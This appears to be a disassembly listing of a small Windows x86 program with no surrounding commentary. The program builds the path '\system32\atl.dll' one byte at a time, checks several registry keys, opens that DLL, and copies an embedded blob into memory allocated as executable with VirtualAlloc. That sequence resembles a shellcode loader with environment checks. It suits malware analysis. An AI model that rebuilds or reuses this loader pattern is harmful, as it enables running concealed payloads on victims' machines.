0x00401010:	pushl	%ebp	; from: 0x00401535(MAY)
0x00401011:	movl	%esp, %ebp
0x00401013:	subl	$0x8, %esp
0x00401016:	movl	0x8(%ebp), %eax
0x00401019:	movl	%eax, -4(%ebp)
0x0040101c:	movl	0xc(%ebp), %ecx
0x0040101f:	movl	%ecx, -8(%ebp)
0x00401022:	movl	-4(%ebp), %edx
0x00401025:	cmpl	-8(%ebp), %edx
0x00401028:	jae	0x00401031	; targets: 0x0040102a(MAY)
0x0040102a:	movl	-4(%ebp), %eax	; from: 0x00401028(MAY)
0x0040102d:	jmp	0x00401034	; targets: 0x00401034(MAY)
0x00401034:	movl	%ebp, %esp	; from: 0x0040102d(MAY)
0x00401036:	popl	%ebp
0x00401037:	ret	; targets: 0x0040153a(MAY)

0x00401040:	pushl	%ebp	; from: 0x00401501(MAY)
0x00401041:	movl	%esp, %ebp
0x00401043:	popl	%ebp
0x00401044:	ret	; targets: 0x00401506(MAY)

0x00401050:	pushl	%ebp	; from: 0x00401425(MAY)
0x00401051:	movl	%esp, %ebp
0x00401053:	movl	0x00402014, %eax
0x00401058:	movb	$0x73, 0x3(%eax)
0x0040105c:	movl	0x00402014, %ecx
0x00401062:	movb	$0x74, 0x4(%ecx)
0x00401066:	movl	0x00402014, %edx
0x0040106c:	movb	$0x65, 0x5(%edx)
0x00401070:	movl	0x00402014, %eax
0x00401075:	movb	$0x6d, 0x6(%eax)
0x00401079:	movl	0x00402014, %ecx
0x0040107f:	movb	$0x33, 0x7(%ecx)
0x00401083:	movl	0x00402014, %edx
0x00401089:	movb	$0x32, 0x8(%edx)
0x0040108d:	movl	0x00402014, %eax
0x00401092:	movb	$0x5c, 0x9(%eax)
0x00401096:	movl	0x00402014, %ecx
0x0040109c:	movb	$0x61, 0xa(%ecx)
0x004010a0:	movl	0x00402014, %edx
0x004010a6:	movb	$0x74, 0xb(%edx)
0x004010aa:	movl	0x00402014, %eax
0x004010af:	movb	$0x6c, 0xc(%eax)
0x004010b3:	movl	0x00402014, %ecx
0x004010b9:	movb	$0x2e, 0xd(%ecx)
0x004010bd:	movl	0x00402014, %edx
0x004010c3:	movb	$0x64, 0xe(%edx)
0x004010c7:	movl	0x00402014, %eax
0x004010cc:	movb	$0x6c, 0xf(%eax)
0x004010d0:	movl	0x00402014, %ecx
0x004010d6:	movb	$0x6c, 0x10(%ecx)
0x004010da:	movl	0x00402014, %edx
0x004010e0:	movb	$0x5c, (%edx)
0x004010e3:	movl	0x00402014, %eax
0x004010e8:	movb	$0x73, 0x1(%eax)
0x004010ec:	movl	0x00402014, %ecx
0x004010f2:	movb	$0x79, 0x2(%ecx)
0x004010f6:	popl	%ebp
0x004010f7:	ret	; targets: 0x0040142a(MAY)

0x004011c0:	pushl	%ebp	; from: 0x004014ce(MAY)
0x004011c1:	movl	%esp, %ebp
0x004011c3:	movl	0x8(%ebp), %eax
0x004011c6:	movl	-4(%eax), %eax
0x004011c9:	popl	%ebp
0x004011ca:	ret	; targets: 0x004014d3(MAY)

0x004011d0:	pushl	%ebp	; from: 0x004014e3(MAY)
0x004011d1:	movl	%esp, %ebp
0x004011d3:	subl	$0x8, %esp
0x004011d6:	movl	$0x19c, -4(%ebp)
0x004011dd:	movl	VirtualAlloc@kernel32.dll, %eax
0x004011e2:	movl	%eax, -8(%ebp)
0x004011e5:	pushl	$0x40
0x004011e7:	pushl	$0x3000
0x004011ec:	movl	0x8(%ebp), %ecx
0x004011ef:	pushl	%ecx
0x004011f0:	pushl	$0x0
0x004011f2:	call	-8(%ebp)	; targets: 0xff000020(MAY)
0x004011f5:	movl	%ebp, %esp
0x004011f7:	popl	%ebp
0x004011f8:	ret	; targets: 0x004014e8(MAY)

0x00401290:	pushl	%ebp	; from: 0x00401563(MAY)
0x00401291:	movl	%esp, %ebp
0x00401293:	subl	$0x8, %esp
0x00401296:	movl	$0x52f3, -4(%ebp)
0x0040129d:	movl	$0x52f3, -4(%ebp)
0x004012a4:	movl	$0x0, 0x00417c98
0x004012ae:	jmp	0x004012bd	; targets: 0x004012bd(MAY)
0x004012b0:	movl	0x00417c98, %eax	; from: 0x004012fa(MAY)
0x004012b5:	addl	$0x1, %eax
0x004012b8:	movl	%eax, 0x00417c98
0x004012bd:	movl	0x00417c98, %ecx	; from: 0x004012ae(MAY)
0x004012c3:	cmpl	0x10(%ebp), %ecx
0x004012c6:	jae	0x004012fc	; targets: 0x004012c8(MAY), 0x004012fc(MAY)
0x004012c8:	movl	$0x52f3, -4(%ebp)	; from: 0x004012c6(MAY)
0x004012cf:	movl	0xc(%ebp), %edx
0x004012d2:	addl	0x00417c98, %edx
0x004012d8:	movzbl	(%edx), %eax
0x004012db:	movl	%eax, -8(%ebp)
0x004012de:	movl	$0x86, -4(%ebp)
0x004012e5:	movl	0x8(%ebp), %ecx
0x004012e8:	addl	0x00417c98, %ecx
0x004012ee:	movb	-8(%ebp), %dl
0x004012f1:	movb	%dl, (%ecx)
0x004012f3:	movl	$0x52f3, -4(%ebp)
0x004012fa:	jmp	0x004012b0	; targets: 0x004012b0(MAY)
0x004012fc:	movl	%ebp, %esp	; from: 0x004012c6(MAY)
0x004012fe:	popl	%ebp
0x004012ff:	ret	; targets: unresolved

0x00401300:	pushl	%ebp	; from: 0x004014c3(MAY)
0x00401301:	movl	%esp, %ebp
0x00401303:	movl	$0x40251c, 0x00417c9c
0x0040130d:	popl	%ebp
0x0040130e:	ret	; targets: 0x004014c8(MAY)


start:
0x00401310:	pushl	%ebp
0x00401311:	movl	%esp, %ebp
0x00401313:	subl	$0x170, %esp
0x00401319:	pusha	
0x0040131a:	movl	%ebp, 0x00417ca0
0x00401320:	movl	$0x0, -324(%ebp)
0x0040132a:	leal	-296(%ebp), %eax
0x00401330:	pushl	%eax
0x00401331:	pushl	$0x20019
0x00401336:	pushl	$0x0
0x00401338:	pushl	$0x40206c
0x0040133d:	pushl	$0x80000002
0x00401342:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000060(MAY)
0x00401348:	testl	%eax, %eax
0x0040134a:	je	0x0040135b	; targets: 0x0040134c(MAY), 0x0040135b(MAY)
0x0040134c:	pushl	$0x4	; from: 0x0040134a(MAY)
0x0040134e:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000040(MAY)
0x00401354:	xorl	%eax, %eax
0x00401356:	jmp	0x00401776	; targets: 0x00401776(MAY)
0x0040135b:	leal	-296(%ebp), %ecx	; from: 0x0040134a(MAY)
0x00401361:	pushl	%ecx
0x00401362:	pushl	$0x20019
0x00401367:	pushl	$0x0
0x00401369:	pushl	$0x402080
0x0040136e:	movl	-296(%ebp), %edx
0x00401374:	pushl	%edx
0x00401375:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000060(MAY)
0x0040137b:	testl	%eax, %eax
0x0040137d:	je	0x0040138e	; targets: 0x0040137f(MAY), 0x0040138e(MAY)
0x0040137f:	pushl	$0x4	; from: 0x0040137d(MAY)
0x00401381:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000040(MAY)
0x00401387:	xorl	%eax, %eax
0x00401389:	jmp	0x00401776	; targets: 0x00401776(MAY)
0x0040138e:	leal	-296(%ebp), %eax	; from: 0x0040137d(MAY)
0x00401394:	pushl	%eax
0x00401395:	pushl	$0x20019
0x0040139a:	pushl	$0x0
0x0040139c:	pushl	$0x402090
0x004013a1:	movl	-296(%ebp), %ecx
0x004013a7:	pushl	%ecx
0x004013a8:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000060(MAY)
0x004013ae:	testl	%eax, %eax
0x004013b0:	je	0x004013c1	; targets: 0x004013b2(MAY), 0x004013c1(MAY)
0x004013b2:	pushl	$0x4	; from: 0x004013b0(MAY)
0x004013b4:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000040(MAY)
0x004013ba:	xorl	%eax, %eax
0x004013bc:	jmp	0x00401776	; targets: 0x00401776(MAY)
0x004013c1:	movl	CreateFileA@kernel32.dll, %edx	; from: 0x004013b0(MAY)
0x004013c7:	movl	%edx, -344(%ebp)
0x004013cd:	movl	$0x0, -276(%ebp)
0x004013d7:	movl	$0x64, -316(%ebp)
0x004013e1:	movl	$0x1, -284(%ebp)
0x004013eb:	movl	$0x0, -324(%ebp)
0x004013f5:	movl	$0x0, -292(%ebp)
0x004013ff:	movl	$0x1, -312(%ebp)
0x00401409:	movl	$0x3, -280(%ebp)
0x00401413:	pushl	$0x104
0x00401418:	leal	-272(%ebp), %eax
0x0040141e:	pushl	%eax
0x0040141f:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000070(MAY)
0x00401425:	call	0x00401050	; targets: 0x00401050(MAY)
0x0040142a:	leal	-296(%ebp), %ecx	; from: 0x004010f7(MAY)
0x00401430:	pushl	%ecx
0x00401431:	pushl	$0x20019
0x00401436:	pushl	$0x0
0x00401438:	pushl	$0x4020b0
0x0040143d:	movl	-296(%ebp), %edx
0x00401443:	pushl	%edx
0x00401444:	call	RegOpenKeyExW@advapi32.dll	; targets: 0xff000060(MAY)
0x0040144a:	testl	%eax, %eax
0x0040144c:	je	0x0040145d	; targets: 0x0040145d(MAY), 0x0040144e(MAY)
0x0040144e:	pushl	$0x4	; from: 0x0040144c(MAY)
0x00401450:	call	LoadLibraryW@kernel32.dll	; targets: 0xff000040(MAY)
0x00401456:	xorl	%eax, %eax
0x00401458:	jmp	0x00401776	; targets: 0x00401776(MAY)
0x0040145d:	movl	0x00402014, %eax	; from: 0x0040144c(MAY)
0x00401462:	pushl	%eax
0x00401463:	leal	-272(%ebp), %ecx
0x00401469:	pushl	%ecx
0x0040146a:	call	lstrlenA@kernel32.dll	; targets: 0xff000010(MAY)
0x00401470:	leal	-272(%ebp,%eax), %edx
0x00401477:	pushl	%edx
0x00401478:	call	lstrcpyA@kernel32.dll	; targets: 0xff000030(MAY)
0x0040147e:	pushl	$0x0
0x00401480:	pushl	$0x80
0x00401485:	pushl	$0x3
0x00401487:	pushl	$0x0
0x00401489:	movl	-280(%ebp), %eax
0x0040148f:	pushl	%eax
0x00401490:	movl	-312(%ebp), %ecx
0x00401496:	pushl	%ecx
0x00401497:	leal	-272(%ebp), %edx
0x0040149d:	pushl	%edx
0x0040149e:	call	-344(%ebp)	; targets: 0xff000050(MAY)
0x004014a4:	movl	%eax, -300(%ebp)
0x004014aa:	cmpl	$0xffffffff, -300(%ebp)
0x004014b1:	je	0x004014bc	; targets: 0x004014bc(MAY), 0x004014b3(MAY)
0x004014b3:	cmpl	$0x0, -300(%ebp)	; from: 0x004014b1(MAY)
0x004014ba:	jne	0x004014c3	; targets: 0x004014bc(MAY), 0x004014c3(MAY)
0x004014bc:	xorl	%eax, %eax	; from: 0x004014ba(MAY), 0x004014b1(MAY)
0x004014be:	jmp	0x00401776	; targets: 0x00401776(MAY)
0x004014c3:	call	0x00401300	; targets: 0x00401300(MAY)	; from: 0x004014ba(MAY)
0x004014c8:	movl	0x00417c9c, %eax	; from: 0x0040130e(MAY)
0x004014cd:	pushl	%eax
0x004014ce:	call	0x004011c0	; targets: 0x004011c0(MAY)
0x004014d3:	addl	$0x4, %esp	; from: 0x004011ca(MAY)
0x004014d6:	movl	%eax, -328(%ebp)
0x004014dc:	movl	-328(%ebp), %ecx
0x004014e2:	pushl	%ecx
0x004014e3:	call	0x004011d0	; targets: 0x004011d0(MAY)
0x004014e8:	addl	$0x4, %esp	; from: 0x004011f8(MAY)
0x004014eb:	movl	%eax, -320(%ebp)
0x004014f1:	movl	-328(%ebp), %edx
0x004014f7:	pushl	%edx
0x004014f8:	pushl	$0x0
0x004014fa:	movl	-320(%ebp), %eax
0x00401500:	pushl	%eax
0x00401501:	call	0x00401040	; targets: 0x00401040(MAY)
0x00401506:	addl	$0xc, %esp	; from: 0x00401044(MAY)
0x00401509:	movl	-328(%ebp), %ecx
0x0040150f:	movl	%ecx, -336(%ebp)
0x00401515:	movl	-324(%ebp), %edx
0x0040151b:	cmpl	-328(%ebp), %edx
0x00401521:	jae	0x004015ac	; targets: 0x00401527(MAY)
0x00401527:	movl	-336(%ebp), %eax	; from: 0x00401521(MAY)
0x0040152d:	pushl	%eax
0x0040152e:	movl	-316(%ebp), %ecx
0x00401534:	pushl	%ecx
0x00401535:	call	0x00401010	; targets: 0x00401010(MAY)
0x0040153a:	addl	$0x8, %esp	; from: 0x00401037(MAY)
0x0040153d:	movl	%eax, -340(%ebp)
0x00401543:	movl	-340(%ebp), %edx
0x00401549:	pushl	%edx
0x0040154a:	movl	0x00417c9c, %eax
0x0040154f:	addl	-292(%ebp), %eax
0x00401555:	pushl	%eax
0x00401556:	movl	-320(%ebp), %ecx
0x0040155c:	addl	-324(%ebp), %ecx
0x00401562:	pushl	%ecx
0x00401563:	call	0x00401290	; targets: 0x00401290(MAY)
0x00401776:	movl	%ebp, %esp	; from: 0x00401389(MAY), 0x00401458(MAY), 0x004013bc(MAY), 0x00401356(MAY), 0x004014be(MAY)
0x00401778:	popl	%ebp
0x00401779:	ret	; targets: 0xfee70000(MAY)

